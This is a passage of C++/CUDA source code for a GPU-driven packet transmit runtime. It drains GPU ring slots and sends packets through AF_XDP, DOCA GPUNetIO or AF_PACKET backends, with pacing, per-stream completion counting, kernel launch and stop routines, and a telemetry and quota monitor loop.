      handle,
      completion_frame_ids,
      static_cast<int>(completion_capacity),
      errbuf,
      sizeof(errbuf));
  if (reaped <= 0) {
    return 0;
  }
  for (int i = 0; i < reaped; ++i) {
    const uint32_t fid = completion_frame_ids[static_cast<size_t>(i)];
    if (fid >= static_cast<uint32_t>(rt.ring_slots)) {
      continue;
    }
    const int idx = q * rt.ring_slots + static_cast<int>(fid);
    PersistentRingSlot& slot = rt.rings_host[idx];
    const int slot_idx = slot.stream_slot;
    slot.state = 0;
    slot.len = 0;
    slot.stream_id = 0;
    slot.stream_slot = -1;
    slot.protocol = 0;
    slot.tx_timestamp_ns = 0u;
    (void)persistent_set_device_slot_state(rt, q, fid, 0);
    local_released += 1u;
    if (slot_idx >= 0 && slot_idx < kPersistentMaxStreams) {
      rt.completed_by_slot[static_cast<size_t>(slot_idx)].fetch_add(1u, std::memory_order_relaxed);
      if (rt.streams) {
        host_u32_add(&rt.streams[slot_idx].completed, 1u);
      }
    }
  }
  return reaped;
}

inline void persistent_bridge_loop(int worker_idx, int worker_count) {
  PersistentRuntime& rt = g_persistent_runtime;
  const int workers = std::max(1, worker_count);
  const int worker = std::max(0, worker_idx);
  std::vector<uint32_t> submit_frame_ids;
  std::vector<uint16_t> submit_lengths;
  std::vector<uint32_t> completion_frame_ids;
  std::vector<uint32_t> afpacket_slot_ids;
  std::vector<int32_t> afpacket_stream_slots;
  std::vector<const uint8_t*> doca_packet_ptrs;
  std::vector<uint64_t> doca_tx_timestamps_ns;
  std::vector<uint8_t> afpacket_batch_payload;
  submit_frame_ids.reserve(static_cast<size_t>(std::max(1, rt.bridge_max_burst)));
  submit_lengths.reserve(static_cast<size_t>(std::max(1, rt.bridge_max_burst)));
  completion_frame_ids.resize(static_cast<size_t>(std::max(64, rt.bridge_max_burst)));
  afpacket_slot_ids.reserve(static_cast<size_t>(std::max(1, rt.bridge_max_burst)));
  afpacket_stream_slots.reserve(static_cast<size_t>(std::max(1, rt.bridge_max_burst)));
  doca_packet_ptrs.reserve(static_cast<size_t>(std::max(1, rt.bridge_max_burst)));
  doca_tx_timestamps_ns.reserve(static_cast<size_t>(std::max(1, rt.bridge_max_burst)));
  while (rt.threads_running.load(std::memory_order_relaxed)) {
    bool progressed = false;
    uint64_t local_sent = 0u;
    uint64_t local_batches = 0u;
    uint64_t local_drops = 0u;
    uint64_t local_released = 0u;
    if (rt.rings_host && rt.ctrl) {
      for (int q = worker; q < rt.queue_count; q += workers) {
        uint32_t& cursor = rt.queue_drain_cursor[static_cast<size_t>(q)];
        if (cursor >= static_cast<uint32_t>(rt.ring_slots)) {
          cursor = 0u;
        }
        const uint64_t t0 = now_ns_steady();
        uint64_t drained = 0;
        while (drained < static_cast<uint64_t>(std::max(1, rt.bridge_max_burst))) {
          if (rt.bridge_drain_budget_ns > 0) {
            const uint64_t elapsed = now_ns_steady() - t0;
            if (elapsed >= static_cast<uint64_t>(rt.bridge_drain_budget_ns)) {
              break;
            }
          }
          if (rt.tx_bridge.kind == PersistentTxBackendKind::kAfXdp && rt.tx_bridge.xdp_api &&
              rt.tx_bridge.xdp_api->submit_frame_ids && rt.tx_bridge.xdp_api->reap_completions &&
              q < static_cast<int>(rt.tx_bridge.xdp_handles.size()) &&
              rt.tx_bridge.xdp_handles[static_cast<size_t>(q)] >= 0) {
            const int handle = rt.tx_bridge.xdp_handles[static_cast<size_t>(q)];
            char errbuf[160];
            errbuf[0] = '\0';
            int reaped = persistent_reap_xdp_completions(
                rt,
                q,
                handle,
                completion_frame_ids.data(),
                completion_frame_ids.size(),
                local_released);
            if (reaped > 0) {
              progressed = true;
            }

            const int burst_limit = std::max(1, rt.bridge_max_burst);
            while (drained < static_cast<uint64_t>(burst_limit)) {
              const int run_budget = std::min<int>(
                  burst_limit - static_cast<int>(drained),
                  rt.ring_slots - static_cast<int>(cursor));
              if (run_budget <= 0) {
                break;
              }
              submit_frame_ids.clear();
              submit_lengths.clear();
              if (!persistent_sync_queue_ring_window_to_host(
                      rt,
                      q,
                      cursor,
                      static_cast<uint32_t>(run_budget))) {
                break;
              }
              if (!persistent_bridge_copy_fence(rt)) {
                break;
              }
              for (int i = 0; i < run_budget; ++i) {
                const int idx = q * rt.ring_slots + static_cast<int>(cursor) + i;
                PersistentRingSlot& slot = rt.rings_host[idx];
                if (slot.state != 1) {
                  break;
                }
                const int max_packet = (rt.ctrl && rt.ctrl->max_packet_bytes > 0) ? rt.ctrl->max_packet_bytes : kPersistentMaxPacketBytes;
                if (slot.len <= 0 || slot.len > max_packet) {
                  slot.state = 0;
                  slot.len = 0;
                  slot.stream_id = 0;
                  slot.stream_slot = -1;
                  slot.protocol = 0;
                  slot.tx_timestamp_ns = 0u;
                  (void)persistent_set_device_slot_state(rt, q, static_cast<uint32_t>(cursor + static_cast<uint32_t>(i)), 0);
                  local_drops += 1u;
                  local_released += 1u;
                  cursor = (cursor + 1u) % static_cast<uint32_t>(rt.ring_slots);
                  break;
                }
                submit_frame_ids.push_back(static_cast<uint32_t>(cursor + static_cast<uint32_t>(i)));
                submit_lengths.push_back(static_cast<uint16_t>(slot.len));
              }
              if (submit_frame_ids.empty()) {
                break;
              }
              if (!persistent_copy_payload_batch_to_host(
                      rt,
                      q,
                      submit_frame_ids.data(),
                      submit_lengths.data(),
                      submit_frame_ids.size())) {
                break;
              }
              if (!persistent_bridge_copy_mark(rt)) {
                break;
              }
              bool payload_ready = true;
              if (rt.bridge_copy_overlap_reap) {
                for (;;) {
                  const cudaError_t query_st = cudaEventQuery(rt.bridge_copy_event);
                  if (query_st == cudaSuccess) {
                    break;
                  }
                  if (query_st != cudaErrorNotReady) {
                    payload_ready = false;
                    break;
                  }
                  const int polled = persistent_reap_xdp_completions(
                      rt,
                      q,
                      handle,
                      completion_frame_ids.data(),
                      completion_frame_ids.size(),
                      local_released);
                  if (polled > 0) {
                    progressed = true;
                  }
                  std::this_thread::sleep_for(std::chrono::microseconds(1));
                }
              } else if (!persistent_bridge_copy_wait(rt)) {
                payload_ready = false;
              }
              if (!payload_ready) {
                break;
              }
              int sent = rt.tx_bridge.xdp_api->submit_frame_ids(
                  handle,
                  submit_frame_ids.data(),
                  submit_lengths.data(),
                  static_cast<int>(submit_frame_ids.size()),
                  errbuf,
                  sizeof(errbuf));
              if (sent < 0) {
                sent = 0;
              }
              if (sent > static_cast<int>(submit_frame_ids.size())) {
                sent = static_cast<int>(submit_frame_ids.size());
              }
              for (int i = 0; i < sent; ++i) {
                const int idx = q * rt.ring_slots + static_cast<int>(submit_frame_ids[static_cast<size_t>(i)]);
                PersistentRingSlot& slot = rt.rings_host[idx];
                slot.state = 3;  // in-flight, release on completion.
                (void)persistent_set_device_slot_state(rt, q, submit_frame_ids[static_cast<size_t>(i)], 3);
              }
              if (sent > 0) {
                progressed = true;
                local_sent += static_cast<uint64_t>(sent);
                rt.queue_sent_counts[static_cast<size_t>(q)] += static_cast<uint64_t>(sent);
                drained += static_cast<uint64_t>(sent);
                if (rt.bridge_ipg_ns > 0) {
                  const uint64_t base = (rt.bridge_next_send_ns > 0u ? rt.bridge_next_send_ns : now_ns_steady());
                  const uint64_t target =
                      base + (static_cast<uint64_t>(rt.bridge_ipg_ns) * static_cast<uint64_t>(sent));
                  bridge_wait_until_ns(target);
                  rt.bridge_next_send_ns = target;
                }
              }
              cursor = (cursor + static_cast<uint32_t>(sent)) % static_cast<uint32_t>(rt.ring_slots);
              if (sent == 0 || sent < static_cast<int>(submit_frame_ids.size())) {
                break;
              }
            }
	            if (drained == 0u) {
	              break;
	            }
	            continue;
	          }

	          if (rt.tx_bridge.kind == PersistentTxBackendKind::kDocaGpuNetIO && rt.tx_bridge.doca_api &&
	              rt.tx_bridge.doca_api->send_vector && q < static_cast<int>(rt.tx_bridge.doca_txq_handles.size()) &&
	              rt.tx_bridge.doca_txq_handles[static_cast<size_t>(q)] >= 0) {
	            const int max_packet =
	                (rt.ctrl && rt.ctrl->max_packet_bytes > 0) ? rt.ctrl->max_packet_bytes : kPersistentMaxPacketBytes;
	            const int burst_limit = std::max(1, rt.bridge_max_burst);
	            const int remaining_budget = std::max(1, burst_limit - static_cast<int>(drained));
	            submit_frame_ids.clear();
	            submit_lengths.clear();
	            afpacket_stream_slots.clear();
	            doca_tx_timestamps_ns.clear();
	            if (!persistent_sync_queue_ring_window_to_host(
	                    rt,
	                    q,
	                    cursor,
	                    static_cast<uint32_t>(std::min(remaining_budget, rt.ring_slots)))) {
	              break;
	            }
	            if (!persistent_bridge_copy_fence(rt)) {
	              break;
	            }
	            uint64_t generated_next_ts =
	                (rt.bridge_next_send_ns > 0u ? rt.bridge_next_send_ns : now_ns_steady());
	            for (int i = 0; i < std::min(remaining_budget, rt.ring_slots); ++i) {
	              const uint32_t slot_id = (cursor + static_cast<uint32_t>(i)) % static_cast<uint32_t>(rt.ring_slots);
	              const int idx = q * rt.ring_slots + static_cast<int>(slot_id);
	              PersistentRingSlot& slot = rt.rings_host[idx];
	              if (slot.state != 1) {
	                continue;
	              }
	              if (slot.len <= 0 || slot.len > max_packet) {
	                slot.state = 0;
	                slot.len = 0;
	                slot.stream_id = 0;
	                slot.stream_slot = -1;
	                slot.protocol = 0;
	                slot.tx_timestamp_ns = 0u;
	                (void)persistent_set_device_slot_state(rt, q, slot_id, 0);
	                local_drops += 1u;
	                local_released += 1u;
	                progressed = true;
	                continue;
	              }
	              uint64_t slot_tx_ns = slot.tx_timestamp_ns;
	              if (slot_tx_ns == 0u && rt.bridge_ipg_ns > 0) {
	                slot_tx_ns = generated_next_ts;
	                generated_next_ts =
	                    slot_tx_ns + static_cast<uint64_t>(std::max(0, rt.bridge_ipg_ns));
	              }
	              submit_frame_ids.push_back(slot_id);
	              submit_lengths.push_back(static_cast<uint16_t>(slot.len));
	              afpacket_stream_slots.push_back(slot.stream_slot);
	              doca_tx_timestamps_ns.push_back(slot_tx_ns);
	              if (static_cast<int>(submit_frame_ids.size()) >= remaining_budget) {
	                break;
	              }
	            }
	            if (submit_frame_ids.empty()) {
	              break;
	            }
	            if (!persistent_copy_payload_batch_to_host(
	                    rt,
	                    q,
	                    submit_frame_ids.data(),
	                    submit_lengths.data(),
	                    submit_frame_ids.size())) {
	              break;
	            }
	            if (!persistent_bridge_copy_fence(rt)) {
	              break;
	            }
	            doca_packet_ptrs.clear();
	            for (size_t i = 0; i < submit_frame_ids.size(); ++i) {
	              const uint32_t slot_id = submit_frame_ids[i];
	              const uint8_t* payload =
	                  rt.payload_host +
	                  ((static_cast<size_t>(q) * static_cast<size_t>(rt.ring_slots) + static_cast<size_t>(slot_id)) *
	                   static_cast<size_t>(kPersistentUmemFrameSize)) +
	                  static_cast<size_t>(kPersistentUmemHeadroom);
	              doca_packet_ptrs.push_back(payload);
	            }
	            int sent = 0;
	            int errors = 0;
	            char errbuf[160];
	            errbuf[0] = '\0';
	            const bool can_timed =
	                (rt.tx_bridge.doca_timed_tx_enabled && rt.tx_bridge.doca_api->send_vector_timed != nullptr);
	            if (rt.tx_bridge.doca_timed_tx_required && !can_timed) {
	              rt.threads_running.store(false, std::memory_order_relaxed);
	              rt.ctrl->run = 0;
	              if (rt.run_flag_dev) {
	                const int32_t run_off = 0;
	                (void)cudaMemcpy(rt.run_flag_dev, &run_off, sizeof(run_off), cudaMemcpyHostToDevice);
	              }
	              break;
	            }
	            const int rc = can_timed
	                               ? rt.tx_bridge.doca_api->send_vector_timed(
	                                     rt.tx_bridge.doca_txq_handles[static_cast<size_t>(q)],
	                                     doca_packet_ptrs.data(),
	                                     submit_lengths.data(),
	                                     afpacket_stream_slots.data(),
	                                     doca_tx_timestamps_ns.data(),
	                                     static_cast<int>(submit_frame_ids.size()),
	                                     &sent,
	                                     &errors,
	                                     errbuf,
	                                     sizeof(errbuf))
	                               : rt.tx_bridge.doca_api->send_vector(
	                                     rt.tx_bridge.doca_txq_handles[static_cast<size_t>(q)],
	                                     doca_packet_ptrs.data(),
	                                     submit_lengths.data(),
	                                     afpacket_stream_slots.data(),
	                                     static_cast<int>(submit_frame_ids.size()),
	                                     &sent,
	                                     &errors,
	                                     errbuf,
	                                     sizeof(errbuf));
	            if (sent < 0) {
	              sent = 0;
	            }
	            if (sent > static_cast<int>(submit_frame_ids.size())) {
	              sent = static_cast<int>(submit_frame_ids.size());
	            }
	            if (rc < 0 || sent <= 0) {
	              rt.threads_running.store(false, std::memory_order_relaxed);
	              rt.ctrl->run = 0;
	              if (rt.run_flag_dev) {
	                const int32_t run_off = 0;
	                (void)cudaMemcpy(rt.run_flag_dev, &run_off, sizeof(run_off), cudaMemcpyHostToDevice);
	              }
	              break;
	            }
	            for (int i = 0; i < sent; ++i) {
	              const uint32_t slot_id = submit_frame_ids[static_cast<size_t>(i)];
	              const int idx = q * rt.ring_slots + static_cast<int>(slot_id);
	              PersistentRingSlot& slot = rt.rings_host[idx];
	              slot.state = 0;
	              slot.len = 0;
	              slot.stream_id = 0;
	              slot.stream_slot = -1;
	              slot.protocol = 0;
	              slot.tx_timestamp_ns = 0u;
	              (void)persistent_set_device_slot_state(rt, q, slot_id, 0);
	              local_released += 1u;
	              const int32_t slot_idx = afpacket_stream_slots[static_cast<size_t>(i)];
	              if (slot_idx >= 0 && slot_idx < kPersistentMaxStreams) {
	                rt.completed_by_slot[static_cast<size_t>(slot_idx)].fetch_add(1u, std::memory_order_relaxed);
	                if (rt.streams) {
	                  host_u32_add(&rt.streams[slot_idx].completed, 1u);
	                }
	              }
	            }
	            drained += static_cast<uint64_t>(sent);
	            progressed = true;
	            local_sent += static_cast<uint64_t>(sent);
	            rt.queue_sent_counts[static_cast<size_t>(q)] += static_cast<uint64_t>(sent);
	            if (can_timed && sent > 0 && static_cast<size_t>(sent) <= doca_tx_timestamps_ns.size()) {
	              const uint64_t last_ts = doca_tx_timestamps_ns[static_cast<size_t>(sent - 1)];
	              if (last_ts > 0u) {
	                rt.bridge_next_send_ns =
	                    last_ts + static_cast<uint64_t>(std::max(0, rt.bridge_ipg_ns));
	              }
	            } else if (!can_timed && rt.bridge_ipg_ns > 0) {
	              const uint64_t base = (rt.bridge_next_send_ns > 0u ? rt.bridge_next_send_ns : now_ns_steady());
	              const uint64_t target =
	                  base + (static_cast<uint64_t>(rt.bridge_ipg_ns) * static_cast<uint64_t>(sent));
	              bridge_wait_until_ns(target);
	              rt.bridge_next_send_ns = target;
	            }
	            cursor = (cursor + static_cast<uint32_t>(sent)) % static_cast<uint32_t>(rt.ring_slots);
	            if (sent < static_cast<int>(submit_frame_ids.size())) {
	              break;
	            }
	            continue;
	          }

	          if (rt.tx_bridge.kind == PersistentTxBackendKind::kAfPacket && rt.tx_bridge.afpacket_send_bridge &&
	                !rt.tx_bridge.iface.empty()) {
              const int max_packet = (rt.ctrl && rt.ctrl->max_packet_bytes > 0) ? rt.ctrl->max_packet_bytes : kPersistentMaxPacketBytes;
              const int burst_limit = std::max(1, rt.bridge_max_burst);
              const int remaining_budget = std::max(1, burst_limit - static_cast<int>(drained));
            afpacket_slot_ids.clear();
            afpacket_stream_slots.clear();
              int packet_size = 0;
              const uint32_t scan_start = cursor;
              const int scan_budget = std::min(remaining_budget, rt.ring_slots);
              if (!persistent_sync_queue_ring_window_to_host(
                      rt,
                      q,
                      scan_start,
                      static_cast<uint32_t>(scan_budget))) {
                break;
              }
              if (!persistent_bridge_copy_fence(rt)) {
                break;
              }
              for (int i = 0; i < scan_budget; ++i) {
                const uint32_t slot_id = (scan_start + static_cast<uint32_t>(i)) % static_cast<uint32_t>(rt.ring_slots);
                const int idx = q * rt.ring_slots + static_cast<int>(slot_id);
              PersistentRingSlot& slot = rt.rings_host[idx];
              if (slot.state != 1) {
                continue;
              }
              if (slot.len <= 0 || slot.len > max_packet) {
                slot.state = 0;
                slot.len = 0;
                slot.stream_id = 0;
                slot.stream_slot = -1;
                slot.protocol = 0;
                slot.tx_timestamp_ns = 0u;
                (void)persistent_set_device_slot_state(rt, q, slot_id, 0);
                local_drops += 1u;
                local_released += 1u;
                progressed = true;
                continue;
              }
              if (packet_size == 0) {
                packet_size = slot.len;
              } else if (slot.len != packet_size) {
                continue;
              }
              afpacket_slot_ids.push_back(slot_id);
              afpacket_stream_slots.push_back(slot.stream_slot);
              if (static_cast<int>(afpacket_slot_ids.size()) >= remaining_budget) {
                break;
              }
            }
            if (afpacket_slot_ids.empty() || packet_size <= 0) {
              break;
            }
            submit_lengths.assign(afpacket_slot_ids.size(), static_cast<uint16_t>(packet_size));
            if (!persistent_copy_payload_batch_to_host(
                    rt,
                    q,
                    afpacket_slot_ids.data(),
                    submit_lengths.data(),
                    afpacket_slot_ids.size())) {
              break;
            }
            if (!persistent_bridge_copy_fence(rt)) {
              break;
            }

            const size_t batch_count = afpacket_slot_ids.size();
            const uint8_t* send_buffer = nullptr;
            size_t send_buffer_len = 0u;
            if (batch_count == 1u) {
              const uint32_t slot_id = afpacket_slot_ids[0];
              send_buffer =
                  rt.payload_host +
                  ((static_cast<size_t>(q) * static_cast<size_t>(rt.ring_slots) + static_cast<size_t>(slot_id)) *
                   static_cast<size_t>(kPersistentUmemFrameSize)) +
                  static_cast<size_t>(kPersistentUmemHeadroom);
              send_buffer_len = static_cast<size_t>(packet_size);
            } else {
              const size_t batch_bytes = static_cast<size_t>(packet_size) * batch_count;
              if (afpacket_batch_payload.size() < batch_bytes) {
                afpacket_batch_payload.resize(batch_bytes);
              }
              for (size_t bi = 0; bi < batch_count; ++bi) {
                const uint32_t slot_id = afpacket_slot_ids[bi];
                const uint8_t* payload =
                    rt.payload_host +
                    ((static_cast<size_t>(q) * static_cast<size_t>(rt.ring_slots) + static_cast<size_t>(slot_id)) *
                     static_cast<size_t>(kPersistentUmemFrameSize)) +
                    static_cast<size_t>(kPersistentUmemHeadroom);
                std::memcpy(
                    afpacket_batch_payload.data() + (bi * static_cast<size_t>(packet_size)),
                    payload,
                    static_cast<size_t>(packet_size));
              }
              send_buffer = afpacket_batch_payload.data();
              send_buffer_len = batch_bytes;
            }

            int sent = 0;
            int errors = 0;
            char errbuf[160];
            errbuf[0] = '\0';
            const int rc = rt.tx_bridge.afpacket_send_bridge(
                rt.tx_bridge.iface.c_str(),
                send_buffer,
                send_buffer_len,
                packet_size,
                static_cast<int>(batch_count),
                rt.tx_bridge.afpacket_mac.data(),
                &sent,
                &errors,
                errbuf,
                sizeof(errbuf));
            if (sent < 0) {
              sent = 0;
            }
            if (sent > static_cast<int>(batch_count)) {
              sent = static_cast<int>(batch_count);
            }
            if (rc < 0 || sent <= 0) {
              local_drops += static_cast<uint64_t>(batch_count);
              // Fail-safe: always release claimed ring slots to avoid
              // head-of-line deadlock when AF_PACKET send path fails.
              for (size_t i = 0; i < batch_count; ++i) {
                const uint32_t slot_id = afpacket_slot_ids[i];
                const int idx = q * rt.ring_slots + static_cast<int>(slot_id);
                PersistentRingSlot& slot = rt.rings_host[idx];
                slot.state = 0;
                slot.len = 0;
                slot.stream_id = 0;
                slot.stream_slot = -1;
                slot.protocol = 0;
                slot.tx_timestamp_ns = 0u;
                (void)persistent_set_device_slot_state(rt, q, slot_id, 0);
                local_released += 1u;
              }
              cursor = (scan_start + static_cast<uint32_t>(batch_count)) % static_cast<uint32_t>(rt.ring_slots);
              progressed = true;
              break;
            }
            for (int i = 0; i < sent; ++i) {
              const uint32_t slot_id = afpacket_slot_ids[static_cast<size_t>(i)];
              const int idx = q * rt.ring_slots + static_cast<int>(slot_id);
              PersistentRingSlot& slot = rt.rings_host[idx];
              slot.state = 0;
              slot.len = 0;
              slot.stream_id = 0;
              slot.stream_slot = -1;
              slot.protocol = 0;
              slot.tx_timestamp_ns = 0u;
              (void)persistent_set_device_slot_state(rt, q, slot_id, 0);
              local_released += 1u;
              const int32_t slot_idx = afpacket_stream_slots[static_cast<size_t>(i)];
              if (slot_idx >= 0 && slot_idx < kPersistentMaxStreams) {
                rt.completed_by_slot[static_cast<size_t>(slot_idx)].fetch_add(1u, std::memory_order_relaxed);
                if (rt.streams) {
                  host_u32_add(&rt.streams[slot_idx].completed, 1u);
                }
              }
            }
            drained += static_cast<uint64_t>(sent);
            progressed = true;
            local_sent += static_cast<uint64_t>(sent);
            rt.queue_sent_counts[static_cast<size_t>(q)] += static_cast<uint64_t>(sent);
            if (rt.bridge_ipg_ns > 0) {
              const uint64_t base = (rt.bridge_next_send_ns > 0u ? rt.bridge_next_send_ns : now_ns_steady());
              const uint64_t target =
                  base + (static_cast<uint64_t>(rt.bridge_ipg_ns) * static_cast<uint64_t>(sent));
              bridge_wait_until_ns(target);
              rt.bridge_next_send_ns = target;
            }
            cursor = (cursor + static_cast<uint32_t>(sent)) % static_cast<uint32_t>(rt.ring_slots);
            if (sent < static_cast<int>(batch_count)) {
              break;
            }
            continue;
          }

          // No native sender backend available: preserve legacy noop drain for non-network test paths.
          if (!persistent_sync_queue_ring_window_to_host(rt, q, cursor, 1u)) {
            break;
          }
          if (!persistent_bridge_copy_fence(rt)) {
            break;
          }
          const int idx = q * rt.ring_slots + static_cast<int>(cursor);
          PersistentRingSlot& slot = rt.rings_host[idx];
          if (slot.state != 1) {
            break;
          }
          const int slot_idx = slot.stream_slot;
          slot.state = 0;
          slot.len = 0;
          slot.stream_id = 0;
          slot.stream_slot = -1;
          slot.protocol = 0;
          slot.tx_timestamp_ns = 0u;
          (void)persistent_set_device_slot_state(rt, q, cursor, 0);
          local_released += 1u;
          local_sent += 1u;
          rt.queue_sent_counts[static_cast<size_t>(q)] += 1u;
          if (slot_idx >= 0 && slot_idx < kPersistentMaxStreams) {
            rt.completed_by_slot[static_cast<size_t>(slot_idx)].fetch_add(1u, std::memory_order_relaxed);
            if (rt.streams) {
              host_u32_add(&rt.streams[slot_idx].completed, 1u);
            }
          }
          drained += 1u;
          progressed = true;
          cursor = (cursor + 1u) % static_cast<uint32_t>(rt.ring_slots);
        }
        if (drained > 0u) {
          local_batches += 1u;
        }
      }
      if (local_sent > 0u) {
        host_u64_add(&rt.ctrl->tx_bridge_sent, local_sent);
        host_u64_add(&rt.ctrl->bridge_drain_packets, local_sent);
      }
      if (local_batches > 0u) {
        host_u64_add(&rt.ctrl->bridge_drain_batches, local_batches);
      }
      if (local_drops > 0u) {
        host_u64_add(&rt.ctrl->ring_drop_events, local_drops);
      }
      if (local_released > 0u) {
        host_u64_add(&rt.ctrl->ring_released, local_released);
      }
      if (worker == 0) {
        const int occ = ring_occupancy_now(rt);
        if (static_cast<uint64_t>(occ) > rt.ctrl->ring_occupancy_peak) {
          rt.ctrl->ring_occupancy_peak = static_cast<uint64_t>(occ);
        }
      }
    }
    if (!progressed) {
      std::this_thread::sleep_for(std::chrono::microseconds(std::max(0, rt.bridge_idle_sleep_us)));
    }
  }
}

inline bool persistent_launch_kernel() {
  PersistentRuntime& rt = g_persistent_runtime;
  if (!rt.ctrl || !rt.ctrl_dev || !rt.run_flag_dev || !rt.streams || !rt.streams_dev || !rt.streams_hot_dev ||
      !rt.rings_dev || !rt.queue_slot_hint_dev || !rt.payload_dev) {
    return false;
  }
  if (rt.doca_kernel_direct_tx && (!rt.doca_gpu_txq_handles_dev || !rt.doca_txq_mkeys_be_dev)) {
    return false;
  }
  PersistentContractRuntime& cr = g_persistent_contract_runtime;
  if (!cr.initialized || !cr.device_mirror_initialized || !cr.update_ring_dev || !cr.ring_head_dev ||
      !cr.ring_tail_dev || !cr.hot_flow_table_dev || !cr.hot_flow_versions_dev || !cr.hot_flow_epochs_dev) {
    return false;
  }
  if (!rt.kernel_stream) {
    if (cudaStreamCreateWithFlags(&rt.kernel_stream, cudaStreamNonBlocking) != cudaSuccess) {
      return false;
    }
  }
  rt.ctrl->run = 1;
  {
    const int32_t run_on = 1;
    if (cudaMemcpy(rt.run_flag_dev, &run_on, sizeof(run_on), cudaMemcpyHostToDevice) != cudaSuccess) {
      return false;
    }
  }
  {
    PersistentKernelStaticConfig cfg{};
    cfg.queue_count = rt.queue_count;
    cfg.ring_slots = rt.ring_slots;
    cfg.max_streams = kPersistentMaxStreams;
    cfg.queue_probe_span = rt.ctrl->queue_probe_span;
    cfg.max_packet_bytes = rt.max_packet_bytes;
    if (cudaMemcpyToSymbol(
            g_persistent_kernel_static_cfg,
            &cfg,
            sizeof(cfg),
            0,
            cudaMemcpyHostToDevice) != cudaSuccess) {
      return false;
    }
  }
  auto env_int_local = [](const char* name, int defv) -> int {
    const char* v = std::getenv(name);
    if (!v || !*v) {
      return defv;
    }
    try {
      return std::stoi(v);
    } catch (...) {
      return defv;
    }
  };
  const int threads = clamp_i(env_int_local("SAMURAI_GPU_PERSISTENT_THREADS", 128), 32, 512);
  const int blocks_env = env_int_local("SAMURAI_GPU_PERSISTENT_BLOCKS", -1);
  int blocks = (blocks_env > 0) ? blocks_env : (rt.queue_count * 4);
  blocks = clamp_i(blocks, 1, 256);
  CUDA_KERNEL_LAUNCH(
      persistent_dataplane_kernel,
      blocks,
      threads,
      rt.kernel_stream,
      rt.run_flag_dev,
      rt.ctrl_dev,
      rt.streams_dev,
      rt.streams_hot_dev,
      rt.rings_dev,
      rt.queue_slot_hint_dev,
      rt.payload_dev,
      rt.doca_gpu_txq_handles_dev,
      rt.doca_txq_mkeys_be_dev,
      cr.update_ring_dev,
      cr.ring_head_dev,
      cr.ring_tail_dev,
      cr.hot_flow_table_dev,
      cr.hot_flow_versions_dev,
      cr.hot_flow_epochs_dev,
      cr.shard_count,
      cr.ring_slots_per_shard,
      cr.hot_flow_capacity);
  return (cudaPeekAtLastError() == cudaSuccess);
}

inline void persistent_stop_kernel() {
  PersistentRuntime& rt = g_persistent_runtime;
  if (rt.ctrl) {
    rt.ctrl->run = 0;
  }
  if (rt.run_flag_dev) {
    const int32_t run_off = 0;
    (void)cudaMemcpy(rt.run_flag_dev, &run_off, sizeof(run_off), cudaMemcpyHostToDevice);
  }
  if (rt.kernel_stream) {
    (void)cudaStreamSynchronize(rt.kernel_stream);
  } else {
    (void)cudaDeviceSynchronize();
  }
}

inline void persistent_monitor_loop() {
  PersistentRuntime& rt = g_persistent_runtime;
  uint64_t prev_produced = 0;
  uint64_t last_progress = now_ns_steady();
  while (rt.threads_running.load(std::memory_order_relaxed)) {
    std::this_thread::sleep_for(std::chrono::milliseconds(std::max(10, rt.heartbeat_ms)));
    if (!rt.ctrl) {
      continue;
    }
    if (rt.doca_kernel_direct_tx && rt.ctrl->run == 0) {
      rt.threads_running.store(false, std::memory_order_relaxed);
      break;
    }
    const uint64_t produced = rt.ctrl->produced;
    if (produced != prev_produced) {
      prev_produced = produced;
      last_progress = now_ns_steady();
      rt.last_progress_ns.store(last_progress, std::memory_order_relaxed);
    }
    {
      std::lock_guard<std::mutex> g(g_persistent_lock);
      const uint64_t now_epoch = now_ns_steady();
      const uint64_t epoch_ns = static_cast<uint64_t>(std::max(1, rt.epoch_ms)) * 1000000ull;
      uint64_t prev_epoch = rt.last_epoch_refill_ns.load(std::memory_order_relaxed);
      bool do_refill = false;
      if (now_epoch >= prev_epoch + epoch_ns) {
        if (rt.last_epoch_refill_ns.compare_exchange_strong(prev_epoch, now_epoch, std::memory_order_relaxed)) {
          do_refill = true;
        }
      }
      bool refill_on_device = false;
      if (do_refill) {
        refill_on_device = persistent_quota_refill_epoch(rt);
        if (!refill_on_device) {
          // Deterministic mode: never fall back to host-side quota refill writes.
          rt.ctrl->native_batch_degrade_events += 1u;
          rt.threads_running.store(false, std::memory_order_relaxed);
          rt.ctrl->run = 0;
          if (rt.run_flag_dev) {
            const int32_t run_off = 0;
            (void)cudaMemcpy(rt.run_flag_dev, &run_off, sizeof(run_off), cudaMemcpyHostToDevice);
          }
          break;
        }
      }
      const bool telemetry_bulk_ok = persistent_stream_copy_all_to_host(rt);
      std::vector<int> telemetry_slots;
      telemetry_slots.reserve(g_persistent_streams.size());
      for (const auto& kv : g_persistent_streams) {
        const auto& st = kv.second;
        if (st.active == 0 || st.device_slot < 0 || st.device_slot >= kPersistentMaxStreams || !rt.streams) {
          continue;
        }
        telemetry_slots.push_back(st.device_slot);
      }
      bool telemetry_slots_ok = telemetry_bulk_ok;
      if (!telemetry_slots_ok && !telemetry_slots.empty()) {
        telemetry_slots_ok = persistent_stream_copy_slots_to_host_batch(
            rt,
            telemetry_slots.data(),
            telemetry_slots.size());
      }
      std::vector<double> fairness_samples;
      fairness_samples.reserve(g_persistent_streams.size());
      for (auto& kv : g_persistent_streams) {
        auto& st = kv.second;
        if (st.active == 0 || st.device_slot < 0 || !rt.streams) {
          continue;
        }
        if (!telemetry_slots_ok) {
          continue;
        }
        st.heartbeat_ns = now_ns_steady();
        PersistentDeviceStreamState& d = rt.streams[st.device_slot];
        const uint64_t completed_delta =
            rt.completed_by_slot[static_cast<size_t>(st.device_slot)].exchange(0u, std::memory_order_relaxed);
        if (completed_delta > 0u) {
          st.completed += completed_delta;
          st.bridge_drain_packets += completed_delta;
          st.progress_ns = now_ns_steady();
        }
        st.quota = d.quota;
        st.ramp_epoch_counter = d.ramp_epoch_counter;
        st.quota_left = d.quota_left;
        st.submitted = d.produced;
        st.completed = std::max<uint64_t>(st.completed, static_cast<uint64_t>(host_u32_load(&d.completed)));
        st.queue_pressure = rt.ctrl->queue_pressure;
        st.quota_stall = rt.ctrl->quota_stall;
        st.bridge_sent = rt.ctrl->tx_bridge_sent;
        st.occupancy_peak = rt.ctrl->ring_occupancy_peak;
        st.bridge_drain_batches = rt.ctrl->bridge_drain_batches;
        st.bridge_drain_packets = rt.ctrl->bridge_drain_packets;
        st.ring_drop_events = rt.ctrl->ring_drop_events;
        fairness_samples.push_back(static_cast<double>(st.submitted));
      }
      if (fairness_samples.size() >= 2) {
        double mean = 0.0;
        for (double x : fairness_samples) {
          mean += x;
        }
        mean /= static_cast<double>(fairness_samples.size());
        double cv = 0.0;
